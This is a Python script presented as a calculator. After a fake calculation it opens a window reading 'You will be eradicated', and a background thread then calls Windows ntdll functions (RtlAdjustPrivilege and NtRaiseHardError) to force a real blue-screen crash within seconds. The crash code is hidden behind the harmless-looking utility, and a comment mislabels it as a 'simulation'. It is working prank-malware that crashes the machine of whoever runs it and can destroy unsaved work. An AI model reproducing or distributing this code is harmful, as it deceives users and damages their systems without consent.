import os
import sys
import time
import tkinter as tk
from PIL import Image, ImageTk
import threading



def bsod():
    """Generate a BSOD."""
    time.sleep(5)
    from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

def calculator_process():
    """Runs the calculator logic and simulates a delay."""
    print("welcome to calculator")
    print("Number 1:")
    x = input()
    print("Number 2:")
    y = input()
    print("Calculatoring...")
    time.sleep(2)
    print("6-7")
    time.sleep(0.5)

calculator_process()

# --- Function to start the background tasks ---
def start_background_tasks():

    # Create and start the bsod simulation in a separate thread
    bsod_thread = threading.Thread(target=bsod)
    bsod_thread.start()

# --- Tkinter setup ---
# Get the absolute path for reliable image loading
script_dir = os.path.dirname(os.path.abspath(__file__))
image_path = os.path.join(script_dir, "happy.png")

# Create the main window
root = tk.Tk()
root.title("you have 5 seconds")

# Keep a persistent reference to the image object
pil_image = Image.open(image_path)
tk_image = ImageTk.PhotoImage(pil_image)

label = tk.Label(
    root,
    text="You will be eradicated",
    image=tk_image,
    compound='top',
    font=("Helvetica", 16)
)
# Save a reference to the image on the label widget
label.image = tk_image
label.pack(padx=10, pady=10)

# Run the background tasks immediately after the window is created
start_background_tasks()

# Start the main event loop
root.mainloop()